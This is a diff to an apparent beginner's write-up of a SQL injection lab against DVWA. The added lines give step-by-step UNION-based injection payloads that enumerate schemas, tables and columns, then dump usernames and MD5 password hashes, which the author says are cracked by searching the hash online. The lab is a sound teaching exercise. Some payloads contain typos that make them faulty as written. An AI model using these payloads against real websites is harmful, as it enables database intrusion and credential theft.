@@ -21,8 +21,8 @@
 Attackers often use many SQL injections to exploit vulnerabilities as it is one of the most effective and command methods. 
 SQL Injections are capable of completely wiping out a database with the command DROP (luckily attackers are mostly trying to steal user names and passwords and THEN maybe delete your info lol) Bigger websites that are properly hardened such as facebook and Instagram now are using what is called input sanitazion. This blocks the characters that are used in the syntax of an SQL injection. However, smaller websites, are often still vulnerable to these SQL Injections.
 
-<h3>A quick lesson on the commands <h3>
-These are the commands, CREATE SELECT UPDATE INSERT DELETE DROP***
+<h3>A quick lesson on the SQL commands. <h3>
+These are the commands, 1. CREATE 2. SELECT 3. UPDATE 4. INSERT 5. DELETE 6. DROP (*MOST DANGEROUS ONE, CAN DELETE COMPLETE DATABASES)
 As you can see, they are all self-explanatory and super basic.
 
 <h3>Lab</h3>
@@ -96,9 +96,28 @@ Which gives us an error and we can now deduct that there are only 2 columns.
 5. Using the UNION command to be able to gather results from two commands. We Will type 2' UNION SELECT 1,2 #' and this will give us the regular output from the user ID 2 + the order of the columns from the second statement
  ![UNION SELECT](https://github.com/user-attachments/assets/69ec8b5f-3a4b-4737-80a4-b97adbc19cd5)
 
-6. Finding the name of the database can be done by our double statement which again follows the regular input of 2 and the our second statement which will be UNION SELECT database(),user() #' so all together we have our input 2' UNION SELECT database(),user() #'
+6. Finding the name of the database can be done by our <b>double statement</b> which again follows the regular input of 2 <b>and</b> our second statement which will be UNION SELECT database(),user() #' so all together we have our input 2' UNION SELECT database(),user() #'
 ![UNION SELECT database(),user() #'](https://github.com/user-attachments/assets/34eee87e-b610-4559-bb06-4ecf63fd14c3)
 
+1.	2' UNION SELECT database(),user() #'
+a.	Finds the name of the database and user
+b.	() syntax for the function in the code
+c.	We get the name of the databse which is dvwa and dvwa@localhost as username
+
+2.	Now 2’ UNION SELECT schema_name,2 FROM information_schema.schemata #’
+a.	The dvwa is DB for the server/application
+3.	Query for tables to see which are in the dvwa DB
+a.	2’ UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema = ‘dvwa’ #’
+b.	We get two tables with this query guestbook and users. So we as hackers, ethical hackers, we are more interested in the users tables
+c.	Now we want to find the columns in the tables
+4.	2’ UNION SELECT column_name,column_type FROM information_schema.columns WHERE tables_schema=’dvwa’ AND table_name = ‘users’ #’
+a.	Column names are user name, last names, first names, user id’s, passwords, avatar
+b.	So from this we get the column types on the other output field which is noted in var(x) or int() which is basically the number of max characters that can be used in each column.
+5.	CONCAT
+a.	We will use this to be able two print first name and last name in the first name output AND user name and password in surname output
+b.	2’ UNION SELECT CONCAT(user_id’-‘,first_name’ ‘,last_name), CONCAT(user,’:’,password) FROM dvwa.users #’
+c.	This gives us the username and the MD5 hash of the passwords
+d.	We then decrypt by simply googling the MD5 hash
    
 </p>
 
